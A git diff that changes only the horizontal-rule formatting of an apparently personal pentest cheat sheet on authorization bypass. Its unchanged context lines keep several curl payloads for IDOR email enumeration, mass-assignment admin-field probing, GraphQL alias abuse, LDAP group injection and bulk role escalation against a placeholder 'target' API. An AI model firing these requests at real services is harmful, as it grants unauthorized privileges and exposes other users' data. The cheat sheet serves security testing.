@@ -19,7 +19,7 @@ linked:
 ---
 # Auth Bypass - Bypass de Autorización
 
-***
+---
 
 ## IDOR / BOLA (Object-Level)
 
@@ -54,7 +54,7 @@ done
 curl -H "Cookie: session=$MY_TOKEN" https://target/api/users/1 | jq .email
 ```
 
-___
+---
 
 ## Mass Assignment (Field-Level Privesc)
 
@@ -70,7 +70,7 @@ ___
 | `for f in isAdmin is_admin admin role roles is_superuser is_staff permissions; do curl -X PATCH -H "$C" -d "{\"$f\":true}" https://target/api/users/me; done` | Bulk field probe | Discovery. |
 ^auth-authz-mass-assign
 
-___
+---
 
 ## Path-Based Privesc
 
@@ -88,7 +88,7 @@ ___
 | `{"query":"{a:adminQuery{...} b:userQuery{...}}"}` (GraphQL alias) | Alias requested admin field | Per-field check missing. |
 ^auth-authz-path
 
-___
+---
 
 ## Role Manipulation
 
@@ -104,7 +104,7 @@ ___
 | `curl -X PATCH -d '{"memberOf":["cn=admin,dc=target,dc=com"]}' https://target/api/users/me` | LDAP DN inject | LDAP-backed apps. |
 ^auth-authz-role
 
-___
+---
 
 ## Verb-Based Authorization Gaps (BFLA)
 
@@ -122,4 +122,4 @@ ___
 | `curl -X POST -H "Cookie: $C" -d '[{"id":2,"role":"admin"}]' https://target/api/users/bulk` | Bulk endpoint con admin actions | Edge BFLA. |
 ^auth-authz-bfla
 
-***
+---
